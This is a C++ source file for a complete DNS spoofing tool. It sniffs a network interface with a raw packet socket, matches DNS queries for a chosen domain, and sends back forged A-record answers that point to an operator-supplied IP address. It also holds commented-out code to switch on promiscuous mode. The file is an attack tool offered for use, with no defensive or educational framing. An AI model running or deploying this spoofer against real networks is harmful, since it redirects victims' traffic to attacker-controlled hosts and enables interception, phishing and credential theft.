#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sstream>
#include <sys/ioctl.h>

#define DNS_PORT 53

struct dns_hdr
{
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount; // Question count
    uint16_t ancount; // Answers count
    uint16_t nscount;
    uint16_t arcount;
};

// No alignment for it to be a wrapper around the buffer
struct __attribute__((packed)) dns_q
{
    char* name;
    uint16_t type;
    uint16_t qclass;
};

struct __attribute__((packed)) dns_a
{
    // uint8_t *name; <- For the simplicity set it manually before the rest
    uint16_t type;
    uint16_t aclass;
    uint32_t ttl;
    uint16_t rdlength; // Length of the resource data
    // unsigned char *rdata; <- I love manual labor
};


int create_socket(const ifreq& interface)
{
    // Create a raw socket
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0)
    {
        perror("Failed to create socket descriptor\n");
        exit(-1);
    }

    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, &interface, sizeof(interface)) < 0)
    {
        perror("Failed to bind socket to interface\n");
        exit(-1);
    }

    return sock;
}

std::string domain_to_qname(const std::string& domain)
{
    std::string qname;
    std::istringstream ss(domain);
    std::string label;

    while (std::getline(ss, label, '.'))
    {
        qname += (char)label.length();
        qname += label;
    }

    qname += '\0';
    return qname;
}


void print_packet(unsigned char* buffer, int size)
{
    for (int i = 0; i < size; i++)
    {
        if (i != 0 && i % 16 == 0)
        {
            printf("\n");
        }
        printf("%02X ", buffer[i]);
    }
    printf("\n");
}

// uint16_t csum(const uint16_t* buf, const int len)
// {
//     uint32_t sum = 0;
//     for (int i = 0; i < len; ++i)
//         sum += htons(*buf++);
//
//     // while (sum >> 16)
//     //     sum = (sum & 0xffff) + (sum >> 16);
//
//     sum = (sum & 0xffff) + (sum >> 16);
//     sum += sum >> 16;
//     return (uint16_t)(~sum);
// }

//rfc1071
uint16_t csum(const uint16_t* buf, int count)
{
    unsigned long sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    //if any bytes left, pad the bytes and add
    if(count > 0) {
        sum += (*buf) & htons(0xFF00);
    }
    //Fold sum to 16 bits
    while (sum>>16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (uint16_t)(~sum);
}
/*
 * @note The buffer should be big enough to append a dns answer to it
 * @note The len will be updated with the new packet size
 * @return true if it is a dns packet
 */
bool process_dns_packet(uint8_t* buffer, int& len, const std::string& qname, in_addr_t ip)
{
    auto* eth_header = (ethhdr*)buffer;
    auto* ip_header = (iphdr*)(buffer + sizeof(ethhdr));
    if (ip_header->protocol != IPPROTO_UDP) return false; // Need udp

    //ihl = 5
    auto* udp_header = (udphdr*)((void*)ip_header + sizeof(iphdr));
    if (ntohs(udp_header->dest) != DNS_PORT) return false; // Need dns

    auto* dns_header = (dns_hdr*)((void*)udp_header + sizeof(udphdr));
    auto* dns_body = (uint8_t*)((void*)dns_header + sizeof(dns_hdr));

    // Multiple questions in a query is quite uncommon
    // Assuming only one question in body
    if (strncmp((char*)dns_body, qname.c_str(), qname.length())) return false; // Check the required qname

    // Construct the response
    // set the response bit
    dns_header->flags = htons(1 << 15 | 1 << 10);
    dns_header->ancount = htons(1);

    // the packet should be big enough to overflow
    // write the C0 0C value, which is a pointer(C0) to the qname at offset(0C = size(dns_hdr))
    // dns_a->name
    buffer[len] = 0xC0;
    buffer[len + 1] = 0x0C;
    // rest of the structure
    auto* dns_answer = (dns_a*)(buffer + len + 2);

    // A - host address
    dns_answer->type = htons(1);
    // IN - the Internet
    dns_answer->aclass = htons(1);
    // set it to an hour
    dns_answer->ttl = htonl(3600);
    // length of an ipv4 address
    dns_answer->rdlength = htons(sizeof(in_addr_t));
    // update the size
    len += sizeof(dns_a) + 2;
    // add the ipv4 address
    *(in_addr_t*)(buffer + len) = ip;
    // update the size
    len += sizeof(in_addr_t);

    // update the rest of the packet
    uint8_t mac_p[ETH_ALEN];
    memcpy(mac_p, eth_header->h_source, ETH_ALEN);
    memcpy(eth_header->h_source, eth_header->h_dest, ETH_ALEN);
    memcpy(eth_header->h_dest, mac_p, ETH_ALEN);

    // swap with xor
    ip_header->saddr = ip_header->saddr ^ ip_header->daddr;
    ip_header->daddr = ip_header->saddr ^ ip_header->daddr;
    ip_header->saddr = ip_header->saddr ^ ip_header->daddr;
    ip_header->tot_len = htons(len - sizeof(ethhdr));
    // recompute the checksum
    ip_header->check = 0;
    ip_header->check = csum((uint16_t*)ip_header, ip_header->ihl << 2);

    udp_header->dest = udp_header->source;
    udp_header->source = htons(DNS_PORT);
    udp_header->len = htons(len - sizeof(ethhdr) - sizeof(iphdr));
    udp_header->check = 0;

    return true;
}

#define BUFFER_SIZE 65536

int read_packet(int sock, uint8_t* buffer, int& len)
{
    sockaddr saddr{};
    socklen_t saddr_len = sizeof(saddr);

    if ((len = (int)recvfrom(sock, buffer, BUFFER_SIZE, 0, &saddr, &saddr_len)) < 0)
    {
        perror("Failed to read from socket \n");
        return -1;
    }

    return 0;
}

void send_packet(int sock, sockaddr_ll sock_addr, uint8_t* buffer, int& len)
{
    // set the destination
    memcpy(sock_addr.sll_addr, ((ethhdr*)buffer)->h_dest, ETH_ALEN);

    if (sendto(sock, buffer, len, 0, (sockaddr*)&sock_addr, sizeof(sockaddr_ll)) > 0)
        std::cout << "Sent a packet to socket" << std::endl;
}

int main(const int argc, char* argv[])
{
    if (argc != 4)
    {
        std::cerr << "Usage: <interface> <domain> <resolved_ip>" << std::endl;
        return -1;
    }

    //args
    std::string if_name = argv[1];
    std::string domain = argv[2];
    std::string resolved_ip = argv[3];

    std::string qname = domain_to_qname(domain);
    in_addr_t ip = inet_addr(resolved_ip.c_str());

    ifreq interface{};
    strncpy(interface.ifr_ifrn.ifrn_name, if_name.c_str(), if_name.length() + 1);

    int sockfd = create_socket(interface);
    if (ioctl(sockfd, SIOCGIFINDEX, &interface) < 0)
    {
        perror("Failed to retrieve interface index with ioctl");
        close(sockfd);
        return -1;
    }

    // // Enable promiscuous mode
    // if (ioctl(sockfd, SIOCGIFFLAGS, &interface) < 0) {
    //     perror("Failed to get interface flags");
    //     close(sockfd);
    //     return -1;
    // }
    //
    // interface.ifr_flags |= IFF_PROMISC; // Set promiscuous mode flag
    // if (ioctl(sockfd, SIOCSIFFLAGS, &interface) < 0) {
    //     perror("Failed to set promiscuous mode");
    //     close(sockfd);
    //     return -1;
    // }
    // std::cout << "Promiscuous mode enabled on " << if_name << std::endl;

    uint8_t buffer[BUFFER_SIZE];
    int buffer_len = 0;

    sockaddr_ll sock_addr{
        .sll_ifindex = interface.ifr_ifindex,
        .sll_halen = ETH_ALEN,
    };

    while (true)
    {
        if (read_packet(sockfd, buffer, buffer_len)) break;
        if (process_dns_packet(buffer, buffer_len, qname, ip))
            send_packet(sockfd, sock_addr, buffer, buffer_len);
    }

    close(sockfd);
    return 0;
}
